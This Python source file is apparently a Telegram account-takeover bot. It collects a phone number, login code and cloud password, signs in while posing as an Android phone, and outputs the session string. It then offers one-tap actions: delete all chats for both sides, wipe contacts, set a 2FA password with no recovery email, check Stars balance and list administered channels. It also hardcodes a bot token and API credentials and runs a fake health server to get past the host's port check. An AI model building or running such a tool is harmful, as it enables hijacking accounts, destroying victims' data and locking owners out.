import os
import asyncio
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

import telebot
from telebot.async_telebot import AsyncTeleBot
from telebot.asyncio_handler_backends import StatesGroup, State
from telebot.asyncio_storage import StateMemoryStorage
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    PasswordHashInvalidError
)
from telethon.sessions import StringSession
from telethon.tl.functions.contacts import GetContactsRequest, DeleteContactsRequest
from telethon.tl.functions.payments import GetStarsStatusRequest
from telethon.tl.types import InputPeerSelf


# === ФЕЙКОВЫЙ ВЕБ-СЕРВЕР ДЛЯ ОБХОДА ПРОВЕРКИ ПОРТОВ RENDER ===
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is alive!")

    def log_message(self, format, *args):
        # Отключаем спам логов запросов от Render
        return

def run_health_check_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), HealthCheckHandler)
    server.serve_forever()

# Запускаем сервер в фоновом потоке до старта бота
threading.Thread(target=run_health_check_server, daemon=True).start()


# === ДАННЫЕ АВТОРИЗАЦИИ ===
# Получаем данные из переменных окружения (Environment Variables на Render)
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8388590503:AAFMx627vZiHLQVa15dMIqfmcXO4e3uO96g")
API_ID = int(os.environ.get("API_ID", 28155925))
API_HASH = os.environ.get("API_HASH", "13cf6bb2641bfb7e67548650d65d9e7e")

bot = AsyncTeleBot(BOT_TOKEN, state_storage=StateMemoryStorage())
active_clients = {}
user_sessions = {}

class LoginStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_password = State()
    waiting_for_new_2fa = State()

def get_action_keyboard():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🗑 Удалить все чаты", callback_data="clear_chats"),
        InlineKeyboardButton("👥 Удалить все контакты", callback_data="clear_contacts"),
        InlineKeyboardButton("💥 Очистить всё (Чаты + Контакты)", callback_data="clear_all"),
        InlineKeyboardButton("🔐 Установить/Сменить 2FA (Без почты)", callback_data="set_2fa"),
        InlineKeyboardButton("⭐ Проверить баланс Stars и Premium", callback_data="check_balance"),
        InlineKeyboardButton("👑 Выгрузить админ-каналы и группы", callback_data="check_admin")
    )
    return markup

@bot.message_handler(commands=['start'])
async def start_handler(message):
    await bot.delete_state(message.from_user.id, message.chat.id)
    await bot.send_message(
        message.chat.id, 
        "👋 Отправь номер телефона аккаунта в международном формате (например, +380123456789):"
    )
    await bot.set_state(message.from_user.id, LoginStates.waiting_for_phone, message.chat.id)

@bot.message_handler(state=LoginStates.waiting_for_phone)
async def process_phone(message):
    phone = message.text.strip().replace(" ", "").replace("-", "")
    
    client = TelegramClient(
        StringSession(), 
        API_ID, 
        API_HASH,
        device_model="Samsung Galaxy S22",
        system_version="Android 13",
        app_version="10.2.0",
        lang_code="ru"
    )
    await client.connect()
    
    try:
        sent_code = await client.send_code_request(phone)
        active_clients[message.from_user.id] = {
            'client': client,
            'phone': phone,
            'phone_code_hash': sent_code.phone_code_hash
        }
        await bot.set_state(message.from_user.id, LoginStates.waiting_for_code, message.chat.id)
        await bot.send_message(
            message.chat.id, 
            "📩 Код отправлен! Проверь личные сообщения в Telegram на этом аккаунте.\n\nВведи код:"
        )
    except Exception as e:
        await client.disconnect()
        await bot.send_message(
            message.chat.id, 
            f"❌ Ошибка при отправке кода: {e}\nПопробуй ввести номер заново через /start."
        )

@bot.message_handler(state=LoginStates.waiting_for_code)
async def process_code(message):
    user_data = active_clients.get(message.from_user.id)
    if not user_data:
        await bot.send_message(message.chat.id, "Сессия истекла. Начни заново с /start")
        await bot.delete_state(message.from_user.id, message.chat.id)
        return

    client: TelegramClient = user_data['client']
    code = message.text.strip()

    try:
        await client.sign_in(
            phone=user_data['phone'],
            code=code,
            phone_code_hash=user_data['phone_code_hash']
        )
        await finalize_login(message, client)
    except SessionPasswordNeededError:
        await bot.set_state(message.from_user.id, LoginStates.waiting_for_password, message.chat.id)
        await bot.send_message(message.chat.id, "🔐 На аккаунте установлен двухэтапный пароль. Введи его:")
    except PhoneCodeInvalidError:
        await bot.send_message(message.chat.id, "❌ Неверный код. Попробуй ввести еще раз:")
    except PhoneCodeExpiredError:
        await bot.send_message(message.chat.id, "❌ Срок действия кода истек. Начни заново с /start")
        await client.disconnect()
        await bot.delete_state(message.from_user.id, message.chat.id)
    except Exception as e:
        await bot.send_message(message.chat.id, f"❌ Ошибка входа: {e}")
        await client.disconnect()
        await bot.delete_state(message.from_user.id, message.chat.id)

@bot.message_handler(state=LoginStates.waiting_for_password)
async def process_password(message):
    user_data = active_clients.get(message.from_user.id)
    if not user_data:
        await bot.send_message(message.chat.id, "Сессия истекла. Начни заново с /start")
        await bot.delete_state(message.from_user.id, message.chat.id)
        return

    client: TelegramClient = user_data['client']
    password = message.text.strip()

    try:
        await client.sign_in(password=password)
        await finalize_login(message, client)
    except PasswordHashInvalidError:
        await bot.send_message(message.chat.id, "❌ Неверный облачный пароль. Попробуй еще раз:")
    except Exception as e:
        await bot.send_message(message.chat.id, f"❌ Ошибка: {e}")
        await client.disconnect()
        await bot.delete_state(message.from_user.id, message.chat.id)

async def finalize_login(message, client: TelegramClient):
    me = await client.get_me()
    account_id = me.id
    dc_id = client.session.dc_id
    session_str = client.session.save()

    user_sessions[message.from_user.id] = session_str

    try:
        dialogs = await client.get_dialogs()
        chats_count = len(dialogs)
    except Exception:
        chats_count = "Не удалось определить"

    try:
        contacts_result = await client(GetContactsRequest(hash=0))
        contacts_count = len(contacts_result.users)
    except Exception:
        contacts_count = "Не удалось определить"

    spamblock_status = "❓ Не удалось проверить"
    try:
        spambot = await client.get_entity("SpamBot")
        await client.send_message(spambot, "/start")
        await asyncio.sleep(2)
        
        async for msg in client.iter_messages(spambot, limit=1):
            if any(text in msg.text for text in ["Good news", "Ваш аккаунт свободен", "free from any restrictions"]):
                spamblock_status = "🟢 Нет (Чистый)"
            else:
                spamblock_status = "🔴 Есть спамблок"
            break
    except Exception:
        spamblock_status = "⚠️ Ошибка при запросе к SpamBot"

    text = (
        f"✅ *Вход выполнен успешно!*\n\n"
        f"👤 *ID:* `{account_id}` ({len(str(account_id))} цифр)\n"
        f"🌐 *DC ID:* `{dc_id}`\n"
        f"💬 *Количество чатов:* `{chats_count}`\n"
        f"👥 *Количество контактов:* `{contacts_count}`\n"
        f"🛡 *Спамблок:* {spamblock_status}\n\n"
        f"🔑 *Auth Key / Session String:*\n`{session_str}`\n\n"
        f"👇 *Панель управления аккаунтом:*"
    )

    await bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=get_action_keyboard())
    await client.disconnect()
    active_clients.pop(message.from_user.id, None)
    await bot.delete_state(message.from_user.id, message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data in ["clear_chats", "clear_contacts", "clear_all", "check_balance", "check_admin", "set_2fa"])
async def handle_actions(call):
    session_str = user_sessions.get(call.from_user.id)
    if not session_str:
        await bot.answer_callback_query(call.id, "❌ Сессия не найдена. Войдите заново через /start", show_alert=True)
        return

    if call.data == "set_2fa":
        await bot.answer_callback_query(call.id)
        await bot.send_message(call.message.chat.id, "🔐 Введи новый облачный пароль (2FA), который хочешь установить на аккаунт (без почты привязки):")
        await bot.set_state(call.from_user.id, LoginStates.waiting_for_new_2fa, call.message.chat.id)
        return

    await bot.answer_callback_query(call.id, "⏳ Выполняется операция...")
    status_msg = await bot.send_message(call.message.chat.id, "⏳ Подключение к аккаунту...")

    client = TelegramClient(
        StringSession(session_str), 
        API_ID, 
        API_HASH,
        device_model="Samsung Galaxy S22",
        system_version="Android 13",
        app_version="10.2.0",
        lang_code="ru"
    )
    await client.connect()

    try:
        if call.data in ["clear_chats", "clear_all"]:
            await bot.edit_message_text("⏳ Удаление всех чатов и диалогов...", call.message.chat.id, status_msg.message_id)
            dialogs = await client.get_dialogs()
            deleted_chats = 0
            for dialog in dialogs:
                try:
                    await client.delete_dialog(dialog.entity, revoke=True)
                    deleted_chats += 1
                    await asyncio.sleep(0.2)
                except Exception:
                    pass
            await bot.send_message(call.message.chat.id, f"✅ Удалено чатов: {deleted_chats}", reply_markup=get_action_keyboard())

        if call.data in ["clear_contacts", "clear_all"]:
            await bot.edit_message_text("⏳ Удаление всех контактов...", call.message.chat.id, status_msg.message_id)
            contacts_res = await client(GetContactsRequest(hash=0))
            if contacts_res.users:
                await client(DeleteContactsRequest(id=contacts_res.users))
                await bot.send_message(call.message.chat.id, f"✅ Удалено контактов: {len(contacts_res.users)}", reply_markup=get_action_keyboard())
            else:
                await bot.send_message(call.message.chat.id, "ℹ Список контактов пуст.", reply_markup=get_action_keyboard())

        if call.data == "check_balance":
            await bot.edit_message_text("⏳ Проверка баланса Stars и Premium...", call.message.chat.id, status_msg.message_id)
            me = await client.get_me()
            has_premium = "⭐ Да" if getattr(me, 'premium', False) else "❌ Нет"

            try:
                stars_res = await client(GetStarsStatusRequest(peer=InputPeerSelf()))
                stars_balance = stars_res.balance
            except Exception:
                stars_balance = "0 (или ошибка запроса)"

            balance_info = (
                f"💳 *Информация о балансе и Premium:*\n\n"
                f"⭐ *Telegram Premium:* {has_premium}\n"
                f"🌟 *Баланс Telegram Stars:* `{stars_balance}`"
            )
            await bot.send_message(call.message.chat.id, balance_info, parse_mode="Markdown", reply_markup=get_action_keyboard())

        if call.data == "check_admin":
            await bot.edit_message_text("⏳ Поиск каналов и групп с правами администратора...", call.message.chat.id, status_msg.message_id)
            admin_chats = []

            async for dialog in client.iter_dialogs():
                if dialog.is_channel or dialog.is_group:
                    entity = dialog.entity
                    is_creator = getattr(entity, 'creator', False)
                    admin_rights = getattr(entity, 'admin_rights', None)
                    
                    if is_creator or admin_rights is not None:
                        role = "👑 Владелец" if is_creator else "🛠 Админ"
                        username = f"@{entity.username}" if getattr(entity, 'username', None) else f"ID: `{entity.id}`"
                        admin_chats.append(f"• *{dialog.name}* ({username}) — {role}")

            if admin_chats:
                channels_str = "\n".join(admin_chats)
                res_msg = f"👑 *Каналы и группы под управлением ({len(admin_chats)}):*\n\n{channels_str}"
            else:
                res_msg = "ℹ У аккаунта нет каналов или групп с правами владельца/администратора."

            await bot.send_message(call.message.chat.id, res_msg, parse_mode="Markdown", reply_markup=get_action_keyboard())

        await bot.delete_message(call.message.chat.id, status_msg.message_id)

    except Exception as e:
        await bot.send_message(call.message.chat.id, f"❌ Произошла ошибка: {e}", reply_markup=get_action_keyboard())
    finally:
        await client.disconnect()

@bot.message_handler(state=LoginStates.waiting_for_new_2fa)
async def process_new_2fa(message):
    new_password = message.text.strip()
    session_str = user_sessions.get(message.from_user.id)

    if not session_str:
        await bot.send_message(message.chat.id, "❌ Сессия истекла. Войдите заново с /start")
        await bot.delete_state(message.from_user.id, message.chat.id)
        return

    msg = await bot.send_message(message.chat.id, "⏳ Установка 2FA пароля без почты...")

    client = TelegramClient(
        StringSession(session_str), 
        API_ID, 
        API_HASH,
        device_model="Samsung Galaxy S22",
        system_version="Android 13",
        app_version="10.2.0",
        lang_code="ru"
    )
    await client.connect()

    try:
        await client.edit_2fa(new_password=new_password)
        await bot.edit_message_text(
            f"✅ *Облачный пароль успешно установлен без почты!*\nНовый пароль: `{new_password}`", 
            message.chat.id, 
            msg.message_id, 
            parse_mode="Markdown"
        )
        await bot.send_message(message.chat.id, "👇 Выберите следующее действие:", reply_markup=get_action_keyboard())
    except Exception as e:
        await bot.edit_message_text(f"❌ Ошибка при смене 2FA: {e}", message.chat.id, msg.message_id)
        await bot.send_message(message.chat.id, "👇 Меню действий:", reply_markup=get_action_keyboard())
    finally:
        await client.disconnect()
        await bot.delete_state(message.from_user.id, message.chat.id)

if __name__ == "__main__":
    bot.add_custom_filter(telebot.asyncio_filters.StateFilter(bot))
    print("Бот запущен и сервер проверки порта готов!")
    asyncio.run(bot.polling(non_stop=True))
